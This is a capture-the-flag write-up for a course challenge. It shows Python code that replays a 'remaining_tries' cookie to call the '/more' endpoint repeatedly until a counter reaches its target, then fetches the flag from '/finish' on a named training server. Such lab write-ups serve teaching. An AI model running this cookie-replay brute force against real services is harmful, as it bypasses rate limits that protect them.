# Challenge `Python Resquests` Writeup

- Vulnerability:
    - Endpoint is vulnerable to brute-force attack and cookie poisoning

- Where:
    - `/more` endpoint and `remaining_tries` cookie

- Impact:
    - Allows to find the server guess by repeated requests with poisoned cookie

## Steps to reproduce

### Step 1: Get cookie, target value, and current value
Firstly, we need to send a request to `/hello` to get the cookie, the target value and the current value.

```python
import requests
import re

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23054"
s = requests.Session()

# get cookie, target value, and current value from link + /hello
r = s.get(link + "/hello")
cookies = r.cookies.get_dict()
target = re.search(r"target (\d+)", r.text, re.IGNORECASE)[1]
curr = re.search(r"Your current value is: (\d+)", r.text, re.IGNORECASE)[1]
```

### Step 2: Send requests to `/more` until the target value is reached
To be able to send multiple requests to `/more` we need to poison the `remaining_tries` cookie with its value set to 1 which is the value we previously got from `/hello`.

```python
while curr != target:
    r = requests.get(link + "/more", cookies=cookies)
    curr = re.search(r"Your current value is: (\d+)", r.text, re.IGNORECASE)[1]
```

### Step 3: Get flag
Once the target value is reached, send a request to `/finish` to get the flag.

```python
r = s.get(link + "/finish")
print(r.text)
```

## Implementation

The full implementation can be found [here](cookies.py).